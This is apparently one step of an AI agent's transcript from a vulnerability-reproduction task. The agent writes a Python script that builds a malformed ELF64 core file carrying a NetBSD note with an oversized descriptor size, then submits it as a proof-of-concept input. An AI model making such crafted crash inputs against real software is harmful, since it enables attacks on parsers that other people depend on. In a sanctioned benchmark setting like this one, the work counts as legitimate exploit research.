message:
Running command: cd /workspace/repo-vul && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc.bin')
# ELF64 core header + one PT_NOTE + one note with NetBSD core procinfo type and oversized descsz
b=bytearray()
b += b'\x7fELF'          # magic
b += b'\x02\x01\x01\x00' # 64-bit little endian
b += b'\x00'*8
b += (4).to_bytes(2,'little')  # e_type core
b += (62).to_bytes(2,'little') # e_machine amd64
b += (1).to_bytes(4,'little')
b += (0).to_bytes(8,'little')*3
b += (64).to_bytes(4,'little')
b += (56).to_bytes(2,'little')
b += (1).to_bytes(2,'little')
b += (0).to_bytes(2,'little')
b += (0).to_bytes(2,'little')
b += (0).to_bytes(2,'little')
b += (0).to_bytes(2,'little')
# pad to phoff 64
b += b'\x00'*(64-len(b))
# PT_NOTE header
b += (4).to_bytes(4,'little')
b += (0).to_bytes(4,'little')
b += (128).to_bytes(8,'little')
b += (0).to_bytes(8,'little')*2
b += (64).to_bytes(8,'little')
b += (64).to_bytes(8,'little')
b += (4).to_bytes(8,'little')
# pad to note offset 128
b += b'\x00'*(128-len(b))
# note header: namesz=8 descsz=64 type=1
b += (8).to_bytes(4,'little')
b += (64).to_bytes(4,'little')
b += (1).to_bytes(4,'little')
b += b'NetBSD\x00\x00'
b += b'A'*64
p.write_bytes(b)
print(len(b))
PY
bash /workspace/submit.sh /workspace/poc.bin /workspace/candidate_trace.json || true
